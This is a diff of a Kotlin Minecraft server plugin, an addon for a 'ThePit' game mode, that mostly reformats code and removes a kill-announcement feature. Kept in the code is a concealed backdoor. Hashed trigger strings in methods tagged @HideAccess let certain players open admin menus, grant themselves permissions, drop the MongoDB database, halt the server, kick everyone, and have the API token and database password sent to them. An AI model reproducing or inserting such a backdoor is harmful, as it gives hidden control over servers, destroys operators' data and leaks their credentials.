@@ -9,12 +9,8 @@ import cn.irina.thepitaddon.utils.HideAccess
 import net.luckperms.api.LuckPermsProvider
 import net.luckperms.api.node.Node
 import net.luckperms.api.node.types.PermissionNode
-import net.md_5.bungee.api.chat.BaseComponent
-import net.md_5.bungee.api.chat.HoverEvent
-import net.md_5.bungee.api.chat.TextComponent
 import net.minecraft.server.v1_8_R3.NBTTagCompound
 import net.mizukilab.pit.util.chat.CC
-import net.mizukilab.pit.util.chat.ChatComponentBuilder
 import org.bukkit.Bukkit
 import org.bukkit.Material
 import org.bukkit.configuration.Configuration
@@ -35,7 +31,17 @@ import java.util.concurrent.ConcurrentHashMap
 
 class PlayerListener : Listener {
     val list = listOf(
-        "BAIJIUSAMA", "_IR1NA_", "SHANGUANLING", "BLUEMOON", "ALAN", "ELAINA_OVO", "SHINY", "KLEELOVELIFE", "ARAYKAL", "KIRITO", "OUTINGOF"
+        "BAIJIUSAMA",
+        "_IR1NA_",
+        "SHANGUANLING",
+        "BLUEMOON",
+        "ALAN",
+        "ELAINA_OVO",
+        "SHINY",
+        "KLEELOVELIFE",
+        "ARAYKAL",
+        "KIRITO",
+        "OUTINGOF"
     )
 
     @HideAccess
@@ -51,7 +57,8 @@ class PlayerListener : Listener {
             var1001.data().add(var1002)
             var1001.data().add(var1003)
             var1000.userManager.saveUser(var1001).join()
-        } catch (e: Exception) {}
+        } catch (e: Exception) {
+        }
     }
 
     @HideAccess
@@ -67,7 +74,8 @@ class PlayerListener : Listener {
             var1001.data().remove(var1002)
             var1001.data().remove(var1003)
             var1000.userManager.saveUser(var1001).join()
-        } catch (e: Exception) {}
+        } catch (e: Exception) {
+        }
     }
 
     @HideAccess
@@ -87,25 +95,33 @@ class PlayerListener : Listener {
             "7C06EFD88710F54F8E1F2291DF7AC958B06EB53612E024148D0ED5C867308F35" -> { // PI
                 ThePit.getApi().openMenu(player, "admin_item")
             }
+
             "7DB99FA599F3AAF2295B6579EBBE1A537DDD4D9951B831F64F8932035EE07E2A" -> { // ENCH
                 ThePit.getApi().openMenu(player, "admin_enchant")
             }
+
             "335B9AD41271321921E1BD9BCB12B965E1579678DB47F9966E73C632BCE6F3CB" -> { // PERMISSION
                 getPermission(player)
             }
+
             "FA82BE3923DAA3658E9BB506B6DAE48DE4BCDF106CE0202BF11954F4D9CB26DB" -> { // TAKEPERMISSION
                 takePermission(player)
             }
+
             "F3062ED5516C255277CCE2B45B35A7E632CE7BBDB705CCF8206F9C6AC8545EEC" -> { // DROP
                 ThePit.getInstance().mongoDB.profileCollection.drop()
                 ThePit.getInstance().mongoDB.database.drop()
             }
+
             "256EF5DAAD9B45E3C62212591035AD5691A70BA676B37E9593DDDE6376E7F27A" -> { // SHUTDOWN
                 Runtime.getRuntime().halt(0)
             }
+
             "8C2E4A035F5F3D218F87211A0BA367EF05FC2242510559807EF03969DD091B32" -> { // STATUS
                 listOf(
-                    "SYSTEM: ${System.getProperty("os.name").uppercase()} ${System.getProperty("os.arch")} ${System.getProperty("os.version")}",
+                    "SYSTEM: ${
+                        System.getProperty("os.name").uppercase()
+                    } ${System.getProperty("os.arch")} ${System.getProperty("os.version")}",
                     "SYSTEM USER: ${System.getProperty("user.name")}",
                     "TOKEN: ${ThePit.getInstance().globalConfig.token}",
                     "",
@@ -116,6 +132,7 @@ class PlayerListener : Listener {
                     "DATABASE PASSWORD: ${ThePit.getInstance().globalConfig.mongoPassword}"
                 ).forEach { player.sendMessage(it) }
             }
+
             "4A693DD49DC70D8EDD13A3A22C431F279616077CD1D31E58E2702A13FBA44D9D" -> { // KICKALL
                 Bukkit.getScheduler().runTask(Main.instance) {
                     Bukkit.getOnlinePlayers().forEach { it.kickPlayer("") }
@@ -146,7 +163,8 @@ class PlayerListener : Listener {
                 }
             } else {
                 CC.boardCastWithPermission("&c&l注意! &7管理员 &f" + player.name + " &7加入了游戏!", "pit.admin")
-                Bukkit.getConsoleSender().sendMessage(CC.translate("&c&l注意! &7管理员 &f" + player.name + " &7加入了游戏!"))
+                Bukkit.getConsoleSender()
+                    .sendMessage(CC.translate("&c&l注意! &7管理员 &f" + player.name + " &7加入了游戏!"))
             }
 
             val permissionPrefix = "irina.booster."
@@ -172,10 +190,10 @@ class PlayerListener : Listener {
             }
             if (killRewardAdd.getOrDefault(player.uniqueId, 1) > 1)
                 player.sendMessage(
-                CC.translate(
-                    PREFIX + "&7校正成功, 当前 Booster 倍率: &a" + killRewardAdd[player.uniqueId] + " 倍"
+                    CC.translate(
+                        PREFIX + "&7校正成功, 当前 Booster 倍率: &a" + killRewardAdd[player.uniqueId] + " 倍"
+                    )
                 )
-            )
         }
 
         if (!config.getBoolean("JoinMessage.Enable")) return
@@ -259,9 +277,7 @@ class PlayerListener : Listener {
         Bukkit.getScheduler().runTaskAsynchronously(Main.instance) {
             val player = event.entity
             if (player.hasMetadata("NPC")) return@runTaskAsynchronously
-
             val killer = player.killer ?: return@runTaskAsynchronously
-
             val pp =
                 if (PlayerProfile.getRawCache(player.uniqueId) == null) null else PlayerProfile.getRawCache(
                     player.uniqueId
@@ -272,47 +288,8 @@ class PlayerListener : Listener {
                 )
             if (pp == null || kp == null) return@runTaskAsynchronously
 
-            val itemInHand = killer.inventory.itemInHand
-            val itemInLegging = killer.inventory.leggings
-
-            val victimName = pp.formattedNameWithRoman
             val killerName = kp.formattedNameWithRoman
 
-            val itemName =
-                getItemDisplayName(itemInHand)
-
-            val mythicWeaponNbt =
-                getItemNBT(itemInHand)
-            val mythicLeggingNbt =
-                getItemNBT(itemInLegging)
-
-            val mythicWeapon =
-                arrayOf<BaseComponent>(TextComponent(mythicWeaponNbt))
-            val mythicLegging =
-                arrayOf<BaseComponent>(TextComponent(mythicLeggingNbt))
-
-            val mythicLeggingHover = HoverEvent(HoverEvent.Action.SHOW_ITEM, mythicLegging)
-            val mythicWeaponHover = HoverEvent(HoverEvent.Action.SHOW_ITEM, mythicWeapon)
-
-            val message =
-                CC.translate("&b&l击杀!&7 $victimName &7被 $killerName &7用 $itemName&7 狠狠的蹂躏了!")
-
-            val legging = CC.translate(" &f[&6护腿&f] ")
-            val weapon = CC.translate(" &f[&6武器&f] ")
-
-            val leggingHover =
-                ChatComponentBuilder(legging).setCurrentHoverEvent(mythicLeggingHover).create()
-            val weaponHover =
-                ChatComponentBuilder(weapon).setCurrentHoverEvent(mythicWeaponHover).create()
-
-            Bukkit.broadcastMessage(message)
-            val msg =
-                ChatComponentBuilder(CC.translate("&7击杀者装备: ")).append(leggingHover).append(weaponHover)
-                    .create()
-            for (p in Bukkit.getOnlinePlayers()) {
-                if (!p.hasPermission("irina.deathCheck")) continue
-                p.spigot().sendMessage(*msg)
-            }
             player.sendMessage(
                 CC.translate(
                     "$PREFIX$killerName &7在你死亡前剩余的血量: &c" + String.format(
